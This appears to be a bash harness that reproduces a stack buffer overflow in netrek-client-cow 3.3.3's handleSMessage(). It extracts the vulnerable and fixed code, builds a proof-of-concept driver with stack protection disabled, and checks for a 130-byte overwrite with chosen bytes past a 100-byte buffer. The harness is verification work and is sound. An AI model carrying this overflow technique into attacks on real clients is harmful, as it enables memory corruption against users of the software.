#!/usr/bin/env bash
# netrekcow2shell canonical runner.
# Rebuilds the verbatim handleSMessage() body and struct mesg_s_spacket layout
# from pinned netrek-client-cow sources, with released 3.3.4 as fixed control.
# Then drives a server-controlled message body through the exact stack buffer.
# No socket, listener or live target is used.
set -u
cd "$(dirname "$0")" || exit 1
BASE=$PWD
PASS=0
FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
sha() { sha256sum "$1" | cut -d' ' -f1; }

pin() {
    if [ "$(sha "$2")" = "$3" ]; then ok "PIN $1"; else
        printf 'PIN_FAIL %s expected %s got %s\n' "$1" "$3" "$(sha "$2")"
        exit 1
    fi
}

pin tar-v3.3.3 src/3.3.3.tgz 27f36469f896bc0cca185803358f62688d086be1a6c02f3da15cef9f5fe62f64
pin tar-v3.3.4 src/3.3.4.tgz c7a4c08ccfd13dae4f6ca4b75834aa509e5d89f2309587a042133b0b5993de19
pin tar-fix src/fb322e74abee3b0b76a9c5a31df6aab5585d3127.tgz 4d3a44f6a9d9fcba22bcbfb9df6b87d2fbad572b317b338a5c88d044efc60088
pin fix-commit src/fb322e74.patch 7ccf699adf6233a316efb8cd7119d6df2a9c6bead7aae4a1348bc48d993bc8a4
pin driver src/poc.c 2ded3cb55bfaa1ce2921cff4d8c0d1ed75c84ecd6ac53d83a5b3a7135cd3bd48

rm -rf src/v3.3.3 src/v3.3.4 src/fix
mkdir -p src/v3.3.3 src/v3.3.4 src/fix
tar -xzf src/3.3.3.tgz -C src/v3.3.3 --strip-components=1
tar -xzf src/3.3.4.tgz -C src/v3.3.4 --strip-components=1
tar -xzf src/fb322e74abee3b0b76a9c5a31df6aab5585d3127.tgz -C src/fix --strip-components=1

VULN_FILE=src/v3.3.3/short.c
FIX_FILE=src/v3.3.4/short.c
PATCHED_FILE=src/fix/short.c
STRUCT_FILE=src/v3.3.3/packets.h
VULN_START=$(grep -n '^void    handleSMessage' "$VULN_FILE" | cut -d: -f1)
FIX_START=$(grep -n '^void    handleSMessage' "$FIX_FILE" | cut -d: -f1)
if [ "$VULN_START" = 914 ] && [ "$FIX_START" = 916 ]; then
    ok 'PIN verbatim function starts at short.c:914 / :916'
else
    printf 'PIN_FAIL function starts %s/%s (expected 914/916)\n' "$VULN_START" "$FIX_START"
    exit 1
fi

printf '#line 914 "short.c"\n'  > src/hunk_vuln.inc
sed -n '914,951p' "$VULN_FILE"  >> src/hunk_vuln.inc
printf '#line 916 "short.c"\n'  > src/hunk_fixed.inc
sed -n '916,965p' "$FIX_FILE"   >> src/hunk_fixed.inc
printf '#line 916 "short.c"\n'  > src/hunk_fixcommit.inc
sed -n '916,965p' "$PATCHED_FILE" >> src/hunk_fixcommit.inc
printf '#line 1170 "packets.h"\n' > src/mesg_struct.inc
sed -n '1170,1181p' "$STRUCT_FILE" >> src/mesg_struct.inc
if cmp -s src/hunk_fixed.inc src/hunk_fixcommit.inc; then
    ok 'PIN fixed hunk identical in release 3.3.4 and fix commit fb322e74'
else bad 'fixed hunk mismatch'; fi
pin vulnerable-body src/hunk_vuln.inc  fd7a9abd4b33d350c9274d1080e8cb8e935841e203836d114bbb88c1252049de
pin fixed-body      src/hunk_fixed.inc  216dc5454f5ab42d1a1e9f74bb87d292c9caaa04bc92b923c56d06cadec59303
pin packet-struct   src/mesg_struct.inc e706b004f20fa65c53fc2648c0a6c778815015092d54e1121770fce7c2598687

if grep -q 'char    buf\[100\];' src/hunk_vuln.inc && \
   grep -q 'sprintf(buf, "%-9s%s", addrbuf, &packet->mesg);' src/hunk_vuln.inc; then
    ok 'PIN vulnerable verbatim 100-byte stack buf and unchecked sprintf'
else bad 'vulnerable verbatim markers'; fi
if grep -q 'strnlen(&packet->mesg, body_max)' src/hunk_fixed.inc && \
   grep -q 'snprintf(buf, sizeof(buf)' src/hunk_fixed.inc && \
   grep -q 'offsetof(struct mesg_s_spacket, mesg)' src/hunk_fixed.inc; then
    ok 'PIN fixed hunk uses length, strnlen and snprintf'
else bad 'fixed hunk markers'; fi

OUT=src/out
rm -rf "$OUT"; mkdir -p "$OUT" evidence
for CC in gcc clang; do
    $CC -std=gnu99 -O0 -g -fno-stack-protector -fsanitize=address \
        -fno-omit-frame-pointer -Isrc src/poc.c -o "$OUT/vuln-$CC-asan" \
        || { bad "build vuln $CC asan"; continue; }
    $CC -std=gnu99 -O0 -g -fno-stack-protector -fsanitize=address \
        -fsanitize-recover=address -fno-omit-frame-pointer -Isrc src/poc.c \
        -o "$OUT/vuln-$CC-recover" || { bad "build vuln $CC recover"; continue; }
    $CC -std=gnu99 -O0 -g -fno-stack-protector -fsanitize=address \
        -fno-omit-frame-pointer -DFIXED_BUILD -Isrc src/poc.c \
        -o "$OUT/fixed-$CC-asan" || { bad "build fixed $CC asan"; continue; }
    $CC -std=gnu99 -O0 -g -fno-stack-protector -Isrc src/poc.c \
        -o "$OUT/vuln-$CC-plain" || { bad "build vuln $CC plain"; continue; }
    $CC -std=gnu99 -O0 -g -fno-stack-protector -DFIXED_BUILD -Isrc src/poc.c \
        -o "$OUT/fixed-$CC-plain" || { bad "build fixed $CC plain"; continue; }
    ok "builds $CC (vuln/fixed asan, vuln recover, vuln/fixed plain)"
done

asan_clean() {
    bin=$1; arg=$2; tag=$3; want=$4
    log="evidence/$tag.log"
    "$bin" "$arg" >"$log" 2>&1
    if ! grep -q 'AddressSanitizer' "$log" && grep -q "^outlen=$want\$" "$log"; then
        ok "$tag: clean ASan, outlen=$want"
    else bad "$tag: expected clean ASan outlen=$want"; fi
}

for CC in gcc clang; do
    log="evidence/vuln-$CC-asan-attack.log"
    "$OUT/vuln-$CC-asan" attack >"$log" 2>&1
    if grep -q 'ERROR: AddressSanitizer: stack-buffer-overflow' "$log" && \
       grep -q 'WRITE of size 130' "$log" && \
       grep -q 'handleSMessage .*short.c:949' "$log" && \
       grep -q "'buf' (line 916)" "$log"; then
        ok "$CC ASan: stack WRITE-130 at verbatim short.c:949, past buf[100]"
    else bad "$CC ASan: expected stack WRITE-130 at short.c:949"; fi
    asan_clean "$OUT/vuln-$CC-asan" safe "vuln-$CC-asan-safe" 14
    asan_clean "$OUT/fixed-$CC-asan" attack "fixed-$CC-asan-attack" 99
    asan_clean "$OUT/fixed-$CC-asan" safe "fixed-$CC-asan-safe" 14

    log="evidence/vuln-$CC-recover-attack.log"
    ASAN_OPTIONS=halt_on_error=0 "$OUT/vuln-$CC-recover" attack >"$log" 2>&1
    if grep -q 'WRITE of size 130' "$log" && \
       grep -q '^outlen=129$' "$log" && \
       grep -q '^b99=41 b100=4d b101=41 b102=52 b103=4b b128=42 b129=00$' "$log"; then
        ok "$CC recover ASan: chosen M/R/K at buf[100..103] in poisoned redzone"
    else bad "$CC recover ASan: chosen-byte capture"; fi

    log="evidence/vuln-$CC-plain-attack.log"
    "$OUT/vuln-$CC-plain" attack >"$log" 2>&1
    rc=$?
    if [ "$rc" -ne 0 ]; then
        ok "$CC plain: attack crashes (rc=$rc) with 30 bytes past buf"
    else bad "$CC plain: expected attack crash"; fi
    asan_clean "$OUT/vuln-$CC-plain" safe "vuln-$CC-plain-safe" 14
    asan_clean "$OUT/fixed-$CC-plain" attack "fixed-$CC-plain-attack" 99
    asan_clean "$OUT/fixed-$CC-plain" safe "fixed-$CC-plain-safe" 14
done

printf 'RESULT PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
